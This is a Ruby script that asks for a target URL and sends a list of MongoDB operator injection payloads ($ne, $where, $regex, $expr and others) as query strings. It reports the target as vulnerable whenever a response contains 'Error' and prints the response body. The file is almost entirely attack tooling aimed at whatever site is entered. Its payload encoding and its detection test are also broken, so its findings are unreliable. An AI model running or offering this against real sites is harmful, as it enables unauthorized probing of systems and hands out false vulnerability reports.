require 'uri'
require 'net/http'
require 'colorize'

def test_nosql_injection(url)
  uri = URI(url)
  puts "Testing for NoSQL Injection vulnerability on #{url}".yellow
  payloads = [
  { username: { '$ne': 'admin' } },
  { password: { '$ne': 'password' } },
  { email: { '$regex': '.*@example.com' } },
  { '$where': '1 == 1' },
  { '$gt': '' },
  { '$gte': '' },
  { '$lt': '' },
  { '$lte': '' },
  { '$ne': '' },
  { '$in': ['', ''] },
  { '$regex': '' },
  { '$exists': true },
  { '$type': 1 },
  { '$all': ['', ''] },
  { '$elemMatch': { '$gt': '' } },
  { '$comment': 'NoSQL Injection' },
  { '$expr': { '$gt': ['$$document.user_id', 0] } }
  # Add more payloads here
]

  
  payloads.each do |payload|
    uri.query = URI.encode_www_form(payload)
    puts "Testing with payload: #{payload}".yellow
    response = Net::HTTP.get_response(uri)
    if response.body.include?('Error')
      puts "Target is vulnerable to NoSQL Injection!".red
      puts "Response body:".light_yellow
      puts response.body
      # Highlight sensitive information if found in response content
      # Implement highlighting logic here
      return
    end
  end
  
  puts "Target is not vulnerable to NoSQL Injection".green
end

puts "Enter your target website URL: "
target_url = gets.chomp.strip

test_nosql_injection(target_url)
